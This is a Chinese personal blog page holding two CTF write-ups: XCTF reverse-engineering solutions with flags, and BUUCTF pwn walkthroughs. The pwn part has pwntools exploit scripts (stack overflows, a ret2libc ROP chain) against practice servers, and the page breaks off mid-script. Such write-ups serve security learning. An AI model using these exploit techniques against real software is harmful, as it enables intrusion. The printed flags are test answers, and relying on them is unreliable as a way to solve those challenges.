<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/ac1.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fallsilkworms.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>
<meta name="description" content="等一场秋风再起，花开如绎">
<meta property="og:type" content="website">
<meta property="og:title" content="fallsilkworm&#39;s Blog">
<meta property="og:url" content="http://fallsilkworms.github.io/index.html">
<meta property="og:site_name" content="fallsilkworm&#39;s Blog">
<meta property="og:description" content="等一场秋风再起，花开如绎">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="YX">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://fallsilkworms.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>
<title>fallsilkworm's Blog</title>
  




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">fallsilkworm's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">一只千年秋蚕</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="YX"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">YX</p>
  <div class="site-description" itemprop="description">等一场秋风再起，花开如绎</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/" class="post-title-link" itemprop="url">攻防世界进阶Re</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:38:48 / 修改时间：15:44:31" itemprop="dateCreated datePublished" datetime="2021-11-05T15:38:48+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="攻防世界Re进阶区"><a href="#攻防世界Re进阶区" class="headerlink" title="攻防世界Re进阶区"></a>攻防世界Re进阶区</h2><h3 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h3><p>查，32位，直接拖IDA，看到定义了很多字符，尝试按个R</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20210721213826289.png" alt="image-20210721213826289"></p>
<p>直截了当的flag</p>
<h3 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h3><p>查后64位，拖IDA，跟上一题好像，也是定义一堆字符。按R</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20210721215004064.png" alt="image-20210721215004064"></p>
<p>往上翻翻看见了md5，先拿去解密</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20210721215101094.png" alt="image-20210721215101094"></p>
<p>好短啊感觉不太像。查看wp，得知它需要用md5加密后提交，但是要小写的</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20210721215139018.png" alt="image-20210721215139018"></p>
<h3 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h3><p>拿到jar包肯定看Java源码</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20210721210928845.png" alt="image-20210721210928845"></p>
<p>直接除以5取整数可求得<strong>guess_number</strong>为<strong>309137378</strong></p>
<p>接下来打开jar包，要用唯一路径打开，输入得到的number</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20210721211043876.png" alt="image-20210721211043876"></p>
<h3 id="answer-to-everything"><a href="#answer-to-everything" class="headerlink" title="answer_to_everything"></a>answer_to_everything</h3><p>知识补充：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyhlwzy/article/details/77967255">SHA1加密算法_</a></p>
<p>64位elf，IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211102161336660-16360982468217.png" alt="image-20211102161336660"></p>
<p>直接分析可知道kdudpeh就是flag，但是没交对，根据puts的内容可以知道他提交的是一个密码，所以kdudpeh要拿去加密，又根据题目得知有关于SHA1，所以直接拿去加密<a target="_blank" rel="noopener" href="http://www.ttmd5.com/hash.php?type=5">sha1在线解密 在线加密 (ttmd5.com)</a></p>
<p>sha1（kdudpeh）= 80ee2a3fe31da904c596d993f7f1de4827c1450a</p>
<h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>IDA直接进encode</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211102165006801-16360982703248.png" alt="image-20211102165006801"></p>
<p>for循环里是加密方式，很简单。跟进key得知长度为0x12即18</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211102165206372-163609827032410.png" alt="image-20211102165206372"></p>
<p>随后往上看见了加密字符串，提取出来直接逆向</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enflag=[ <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x7A</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x76</span>, <span class="number">0x2E</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x4E</span>, <span class="number">0x69</span>, <span class="number">0x00</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i])-<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i+<span class="number">1</span>])+<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="number">18</span>^enflag[i+<span class="number">2</span>]^<span class="number">6</span>)    </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>知识补充：异或的运算优先级小于+和-，在写脚本的时候需要用小括号括起来。</p>
<h3 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h3><p>绕弯签到题，查完没问题直接IDA很清楚看到</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103170148890-16360982703249.png" alt="image-20211103170148890"></p>
<p>按照数组的正常顺序重新排就是flag了</p>
<p>CZ9dmq4c8g9G7bAX</p>
<h3 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h3><p>签到题，照例无问题IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103171351361-163609827032411.png" alt="image-20211103171351361"></p>
<p>知识补充：<a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-strcat.html">C 库函数 – strcat() | 菜鸟教程 (runoob.com)</a></p>
<p>flag{123_Buff3r_0v3rf|0w}</p>
<h3 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h3><p>常规IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103173633113-163609827032412.png" alt="image-20211103173633113"></p>
<p>直接交是错的，跟进confuseKey</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103173751044-163609827032413.png" alt="image-20211103173751044"></p>
<p>知识补充：<a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-strncpy.html">C 库函数 – strncpy() | 菜鸟教程 (runoob.com)</a></p>
<p>意思就是把上述看到的字符串分成四个部分，每部分十个字符，然后再按照下面的顺序重新排列</p>
<p>所以分好是 daf29f5903（dest） 4938ae4efd（v7） 53fc275d81（src） 053ed5be8c（v15）</p>
<p>按要求排好就是 53fc275d81053ed5be8cdaf29f59034938ae4efd</p>
<h3 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h3><p>wp参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43252204/article/details/108450341">(14条消息) CTF-攻防世界-Reverse-(secret-galaxy-300)_Beglage-CSDN博客</a></p>
<p>IDA主函数没东西，搜字符串发现</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103180046239-163609827032414.png" alt="image-20211103180046239"></p>
<p>追这串字符串的所在函数</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103180214773-163609827032415.png" alt="image-20211103180214773"></p>
<p>全是赋值操作，又有有关字符。其中可能藏着flag</p>
<p>然后用OD动调在开始和结束处设置断点 之后调试一波就出来了</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Re/image-20211103180329803-163609827032416.png" alt="image-20211103180329803"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/Buuctf-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/Buuctf-pwn/" class="post-title-link" itemprop="url">Buuctf pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:34:46 / 修改时间：15:35:05" itemprop="dateCreated datePublished" datetime="2021-11-05T15:34:46+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="buu"><a href="#buu" class="headerlink" title="buu"></a>buu</h2><h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><p>知识补充：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/118144234">pwn远程的时候遇到 timeout: the monitored command dumped core 怎么办_</a></p>
<p>照例一波</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810163325029.png" alt="image-20210810163325029"></p>
<p>啥也没开，直接IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810163356348.png" alt="image-20210810163356348"></p>
<p>有/bin/sh，记录覆盖地址，接着跟进main</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810163422612.png" alt="image-20210810163422612"></p>
<p>栈溢出</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810163445944.png" alt="image-20210810163445944"></p>
<p>15+8=23</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25720</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x401185</span>)+p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="csaw2016"><a href="#csaw2016" class="headerlink" title="csaw2016"></a>csaw2016</h3><p>照例</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810170430280.png" alt="image-20210810170430280"></p>
<p>啥也没开估计也是栈溢出，IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810170459054.png" alt="image-20210810170459054"></p>
<p>栈溢出</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810170529733.png" alt="image-20210810170529733"></p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810170538184.png" alt="image-20210810170538184"></p>
<p>40+8=48</p>
<p>接下来没发现/bin/sh，但是有这个</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810170857375.png" alt="image-20210810170857375"></p>
<p>同样可以返回它的地址拿shell，然后它找到压栈的地址</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810171117509.png" alt="image-20210810171117509"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29116</span>)</span><br><span class="line">sys=<span class="number">0x400611</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn2019"><a href="#ciscn2019" class="headerlink" title="ciscn2019"></a>ciscn2019</h3><p>照例</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810173707633.png" alt="image-20210810173707633"></p>
<p>说值应该是11.28125，输了后也没啥事</p>
<p>IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810173741252.png" alt="image-20210810173741252"></p>
<p>栈溢出，用v1的值覆盖v2</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810173814473.png" alt="image-20210810173814473"></p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810173821370.png" alt="image-20210810173821370"></p>
<p>v1与v2之间为0x30-0x4，先填满，然后再直接打11.28125的地址就行了。因为返回的值为11.28125，在IDA里以十六进制储存。就是0x41348000</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25804</span>)</span><br><span class="line">sys=<span class="number">0x41348000</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x4</span>)+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="sctf2016"><a href="#sctf2016" class="headerlink" title="sctf2016"></a>sctf2016</h3><p>照例</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810174622785.png" alt="image-20210810174622785"></p>
<p>IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210810223418346.png" alt="image-20210810223418346"></p>
<p>虽然fgets那里有规定输入长度32，但是发现strcpy，存在栈溢出，不过大致看了一会儿并不会，看wp</p>
<p>得知这一串内容是让“you”代替“I”，意思是只要“you”的值覆盖掉输入“I”的长度即可，而“you”是3个字符，满足32就用20个“I”然后就变成60个字符造成溢出，再然后加上最后的4</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210811013323435.png" alt="image-20210811013323435"></p>
<p>接下来找到后门</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210811013105693.png" alt="image-20210811013105693"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25454</span>)</span><br><span class="line">sys=<span class="number">0x08048f0d</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn2019-c-1"><a href="#ciscn2019-c-1" class="headerlink" title="ciscn2019_c_1"></a>ciscn2019_c_1</h3><p>wp参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/108224907">BUUCTF——ciscn_2019_c_1_</a></p>
<p><a target="_blank" rel="noopener" href="http://liul14n.top/2020/01/29/ciscn-2019-c-1/">ciscn_2019_c_1 | LiuLian (liul14n.top)</a></p>
<p>照例</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814215923374.png" alt="image-20210814215923374"></p>
<p>IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814233352397.png" alt="image-20210814233352397"></p>
<p>跟进encrypt</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814233419966.png" alt="image-20210814233419966"></p>
<p>gets里可以利用溢出，但是跟进不了v2是因为程序会对我们输入的字符串v2进行一系列异或操作。</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814234919460.png" alt="image-20210814234919460"></p>
<p>再看到下面的<code>++x;</code>，然后也可以推测出x的初始值为0。</p>
<p>这也就是说，只有当我们输入的字符串的长度大于x的值的时候，才会执行这一系列异或操作。</p>
<p>所以如果我们输入两次长度相等的字符串，那么只会对第一次输入的字符串进行异或。</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814233857309.png" alt="image-20210814233857309"></p>
<p>然后这题没有system，就是ret2libc的题型</p>
<p>由于是64位程序传参先找到rdi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn2019c1 --only &quot;pop|ret&quot; | grep rdi</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814234658247.png" alt="image-20210814234658247"></p>
<p>然后由于Ubuntu18运行机制与前面版本的不同，因此调用system需要栈对齐，这里填充ret来对齐</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn2019c1 |grep ret</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210814235141594.png" alt="image-20210814235141594"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25488</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn2019c1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x400c83</span></span><br><span class="line">main = <span class="number">0x400b28</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出的是plt和got表地址</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次payload输出puts_got的内容，我们得控制程序执行流</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<span class="comment">#让它返回到main函数，这样我们才可以再一次利用输入点构造rop </span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收程序返回的地址</span></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))<span class="comment">#不满8位的用0补足</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)<span class="comment">#找到libc版本</span></span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)<span class="comment">#算出偏移量</span></span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#偏移量+libc函数地址=实际函数地址</span></span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次payload，实现交互</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span 